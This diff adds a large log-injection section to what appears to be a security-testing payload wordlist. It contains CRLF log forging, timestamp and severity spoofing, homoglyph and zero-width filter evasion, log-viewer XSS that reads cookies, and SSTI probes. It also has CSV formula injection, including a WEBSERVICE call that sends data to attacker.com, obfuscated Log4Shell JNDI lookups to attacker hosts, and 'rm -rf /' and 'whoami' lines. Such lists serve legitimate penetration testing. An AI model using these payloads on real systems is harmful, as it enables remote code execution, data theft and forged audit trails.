@@ -49,3 +49,167 @@ SELECT * FROM users WHERE username='admin' AND password='wrong'
 <script>alert('XSS')</script>
 ../../../etc/passwd
 ; whoami
+
+# HTTP header-based log injection
+# Many servers log User-Agent, Referer, and X-Forwarded-For verbatim
+User-Agent: admin\n[INFO] authenticated=true
+X-Forwarded-For: 127.0.0.1\r\n[INFO] user=admin login OK
+Referer: \r\n[ERROR] password reset granted for admin
+User-Agent: %0d%0a[ADMIN] session elevated to root
+
+# Log entry spoofing (fake severity / level)
+[INFO] user=attacker action=login result=success
+[WARN] failed login for attacker
+[ERROR] attacker triggered alert
+[FATAL] system compromise by attacker
+
+# Timestamp spoofing
+[2024-01-01 12:00:00] user=admin login ok
+[1970-01-01 00:00:00] cron job executed
+[%Y-%m-%d %H:%M:%S] injected timestamp
+
+# Unicode / homoglyph spoofing to evade keyword filters
+аdmin
+аdmin\n[INFO] authenticated=true
+user=admⅰn
+user=аdmin (Cyrillic 'а')
+
+# Log viewer XSS (when logs are rendered in a web UI)
+</script><script>alert(1)</script>
+<img src=x onerror=alert(document.cookie)>
+<svg/onload=alert(1)>
+<%= ${alert(1)} %>
+{{constructor.constructor('alert(1)')()}}
+
+# Log splitting / forging with multiple delimiters
+admin%0a%0d[INFO] new admin account created
+user=test%0A[OK] privilege escalated
+\r\n\r\n[SYSTEM] backup completed
+
+# ANSI / terminal control escape sequences
+\x1b[2J\x1b[H
+\x1b[?25l
+\x1b]0;injected\x07
+\x1b[31;1mFAKE ALERT\x1b[0m
+
+# Carriage return only (old Mac / some parsers)
+\rAdmin login succeeded\r
+\r[INFO] user=root authenticated
+
+# Tab / whitespace pollution to break column parsers
+admin\trole=admin
+user=guest\tstatus=OK\tbypass=true
+\t\t[INFO] injected row
+
+# JSON log injection (when logs are structured JSON)
+{"user":"admin","auth":"true"}
+","auth":"true"} 
+","level":"ERROR","msg":"injected"} 
+{\"user\":\"admin\"}\n{"user":"attacker","auth":"false"}
+
+# Multi-line / continuation injection for SIEM confusion
+event=login
+  forged=second_event_hidden
+user=attacker
+\tignored_by_parser
+
+# Audit-trail circumvention (hide activity between noise)
+noise_event_1
+user=admin\raction=delete_all
+noise_event_2
+
+# Control character stripping bypass
+admin\u200b\u200b (zero-width spaces)
+user=adm\u200cin (zero-width joiner)
+user=adm\uFEFFin (BOM / zero-width no-break space)
+
+# Log4j / Log4Shell-style injection (CVE-2021-44228)
+${jndi:ldap://attacker.com/a}
+${jndi:ldap://127.0.0.1:1389/exploit}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil/x}
+${jndi:rmi://attacker.example/a}
+${jndi:dns://attacker.com}
+${jndi:ldaps://attacker.com/leak}
+$X{java:version}
+${env:USER}
+${sys:os.name}
+${lower:J}NDI
+${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://x
+
+# Syslog / PRI header injection (RFC 3164 / RFC 5424)
+<34>Oct 13 09:00:00 host app[123]: injected message
+<165>1 2024-01-01T00:00:00Z host proc 123 - injected=1
+<0>kernel: [fake] privilege escalation detected
+<134>user=admin cmd=rm -rf /
+
+# Combined / common web log format injection (Apache/Nginx)
+127.0.0.1 - - [01/Jan/2024:00:00:00 +0000] "GET /x HTTP/1.1" 200 5
+attacker - - "POST /login HTTP/1.1" 200 0 "ref=home" "UA=admin"
+- - [forge] "GET /admin HTTP/1.1" 200 -
+
+# Elasticsearch / Logstash (ELK) injection
+{"@timestamp":"2024-01-01T00:00:00Z","message":"injected"}
+{"message":"x","tags":["injected"]}
+{"message":"${jndi:ldap://x/a}"}
+{"@timestamp":"1970-01-01","message":"backdated event"}
+
+# Cloud logging injection (CloudTrail / Cloud Logging style)
+{"eventName":"AssumeRole","userIdentity":{"arn":"arn:aws:iam::000000000000:user/attacker"}}
+{"insertId":"abc","jsonPayload":{"message":"FORGED"}}
+{"severity":"ERROR","message":"injected severity"}
+{"resource":{"type":"gce_instance"},"protoPayload":{"@type":"forged"}}
+
+# CSV / exported-log injection (when logs are downloaded as CSV)
+=cmd|'/c calc'!A1
++cmd|'/c calc'!A1
+-cmd|'/c calc'!A1
+=HYPERLINK("http://attacker.com","click")
+=WEBSERVICE("http://attacker.com/"&A1)
+@SUM(A1:A10)
+
+# Kubernetes / container log injection
+stdout: {"log":"admin login\n[FAKE] root granted"}
+kubectl logs pod -c app | injected_line
+{"stream":"stdout","log":"\n[ALERT] injected\n"}
+
+# Nginx error_log / access_log format string confusion
+$request_method $request_uri $status
+$remote_addr - $http_user_agent
+$host $request $upstream_response_time
+
+# XML / HTML log export injection (when logs are exported as XML/HTML reports)
+<logentry user="admin" status="ok"/>
+<![CDATA[<script>alert(1)</script>]]>
+&logentry;
+<!-- injected comment -->
+
+# Timezone / locale log evasion
+[2024-01-01 00:00:00 UTC] event
+[2024-01-01 00:00:00 +0530] event
+[01/Jan/2024:00:00:00] tz=local event
+user=admin TZ=GMT-12 event
+
+# Comment / separator confusion for WAF-style log parsers
+# normal line
+// injected admin login
+; forged success
+-- injected entry
+/* injected */ user=admin
+
+# SSTI in log dashboards (Kibana/Grafana-style template rendering)
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+{{config.items()}}
+{{request.application.__globals__}}
+
+# Base64 / encoded log smuggling
+YWRtaW4gbG9nZ2VkIGlu  (admin logged in)
+eyJ1c2VyIjoiYWRtaW4ifQ==  ({"user":"admin"})
+%59%6e%4a%69%5a%57%46%6e%49%47%39%6b (encoded)
+
+# Newline-in-parameter injected via URL-encoded form fields
+username=admin%0a[INFO]+granted
+q=test%0d%0a[OK]+admin
+field=a%0Ab=injected
